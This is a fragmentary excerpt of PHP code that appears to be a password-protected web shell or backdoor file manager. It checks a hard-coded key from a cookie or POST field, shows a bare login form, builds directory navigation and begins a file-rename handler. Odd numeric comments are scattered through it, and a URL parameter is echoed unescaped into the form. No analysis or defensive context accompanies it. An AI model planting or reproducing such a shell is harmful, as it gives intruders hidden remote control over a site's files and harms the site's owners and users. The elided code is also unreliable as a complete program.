...
$auth_key = "1b9595d16f54b6f46a12e66c5d01a619";
...
$pass = false;
if (isset($_COOKIE['pw_name_28616'])) {
    if(($_COOKIE['pw_name_28616']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_28616'])) {
        if(($_POST['pw_name_28616']) == $auth_key) {
            setcookie("pw_name_28616", $_POST['pw_name_28616']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_28616' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1738498133526871 1738498133162584 1738498133683126 1738498133600443
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1738498133526871 1738498133162584 1738498133683126 1738498133600443
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1738498133526871 1738498133162584 1738498133683126 1738498133600443
            $name = PATH . "/" . $_GET['r'];
